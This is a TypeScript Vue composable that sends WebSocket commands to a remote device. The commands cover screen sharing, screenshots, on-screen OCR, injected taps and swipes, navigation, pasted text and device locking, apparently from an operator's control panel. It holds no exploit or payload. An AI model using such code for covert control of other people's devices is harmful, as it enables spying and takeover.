import type { Ref } from 'vue';
import type {
    ScreenControlMessage,
    DataRequestMessage,
    WebSocketOutboundMessage,
} from '@/types/websocket';
import type { LockType, NavigationType } from '@/types/device';

type SendFunction = (message: WebSocketOutboundMessage) => boolean;

export function useScreenControl(
    send: SendFunction,
    deviceId: Ref<string>
) {
    const sendScreenCommand = (
        params: Partial<ScreenControlMessage>
    ): boolean => {
        const message: ScreenControlMessage = {
            itype: 'slr_panel',
            subc: 'screen',
            pid: deviceId.value,
            comand: params.comand!,
            ...params,
        };
        return send(message);
    };

    const sendDataRequest = (
        params: Partial<DataRequestMessage>
    ): boolean => {
        const message: DataRequestMessage = {
            itype: 'slr_panelsend',
            subc: params.subc!,
            pid: deviceId.value,
            ...params,
        };
        return send(message);
    };

    const startScreenShare = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SN',
        });
    };

    const stopScreenShare = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SNOFF',
        });
    };

    const startScreenshot = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SM',
        });
    };

    const stopScreenshot = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SMOFF',
        });
    };

    const startOCR = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SK',
        });
    };

    const stopOCR = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SKOFF',
        });
    };

    const sendTap = (x: number, y: number) => {
        return sendScreenCommand({
            comand: 'mov',
            movetype: '0',
            poi: `${Math.round(x)},${Math.round(y)}`,
        });
    };

    const sendSwipe = (
        startX: number,
        startY: number,
        endX: number,
        endY: number
    ) => {
        return sendScreenCommand({
            comand: 'mov',
            movetype: '1',
            poi: `${Math.round(startX)},${Math.round(startY)},${Math.round(endX)},${Math.round(endY)}`,
        });
    };

    const sendLongPress = (x: number, y: number) => {
        return sendScreenCommand({
            comand: 'mov',
            movetype: '2',
            poi: `${Math.round(x)},${Math.round(y)}`,
        });
    };

    const sendNavigation = (type: NavigationType) => {
        const navMap: Record<NavigationType, 'ho' | 'bak' | 'rec'> = {
            home: 'ho',
            back: 'bak',
            recent: 'rec',
        };
        return sendScreenCommand({
            comand: 'nav',
            navshort: navMap[type],
        });
    };

    const sendVolumeUp = () => {
        return sendScreenCommand({
            comand: 'vol',
            volstate: '0',
        });
    };

    const sendVolumeDown = () => {
        return sendScreenCommand({
            comand: 'vol',
            volstate: '1',
        });
    };

    const showKeyboard = () => {
        return sendScreenCommand({
            comand: 'kb',
            kbstate: '2',
        });
    };

    const hideKeyboard = () => {
        return sendScreenCommand({
            comand: 'kb',
            kbstate: '3',
        });
    };

    const pasteText = (text: string) => {
        return sendScreenCommand({
            comand: 'paste',
            txt: text,
        });
    };

    const setScreenQuality = (quality: number) => {
        const clampedQuality = Math.max(1, Math.min(100, quality));
        return sendScreenCommand({
            comand: 'q',
            newqulity: String(clampedQuality),
        });
    };

    const lockDevice = (type: LockType) => {
        return sendScreenCommand({
            comand: 'L',
            lockit: String(type) as '0' | '1' | '2' | '3',
        });
    };

    const takeScreenshot = () => {
        return sendDataRequest({
            subc: 'screen',
            screentype: 'SM',
        });
    };

    return {
        startScreenShare,
        stopScreenShare,
        startScreenshot,
        stopScreenshot,
        startOCR,
        stopOCR,
        sendTap,
        sendSwipe,
        sendLongPress,
        sendNavigation,
        sendVolumeUp,
        sendVolumeDown,
        showKeyboard,
        hideKeyboard,
        pasteText,
        setScreenQuality,
        lockDevice,
        takeScreenshot,
    };
}
